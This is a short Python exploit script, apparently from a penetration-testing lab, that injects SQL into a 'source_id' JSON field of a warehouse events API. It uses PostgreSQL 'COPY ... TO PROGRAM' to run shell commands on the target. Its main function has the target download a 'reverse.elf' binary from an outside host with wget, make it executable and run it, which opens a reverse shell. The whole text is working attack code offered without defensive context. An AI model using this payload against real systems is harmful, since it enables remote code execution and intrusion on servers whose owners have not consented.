...
def send_sqli(ip, cmd):
  target = f"http://{ip}:80/v1/warehouse/pending-events"
  headers = {
    "Content-Type": "application/json"
  }

  sourceID = f"' OR 1=2; copy (select 'a') to program '{cmd}'-- -"
  data = {
    "source_id": sourceID,
    "task_run_id": "1"
  }
...
def main():
  ...
  dest = "/dev/shm/reverse.elf"
  dest = "./reverse.elf"

  send_sqli(ip, f"wget http://192.168.45.153:8000/reverse.elf -O {dest}")
  send_sqli(ip, f"chmod +x {dest}")
  send_sqli(ip, f"{dest}")
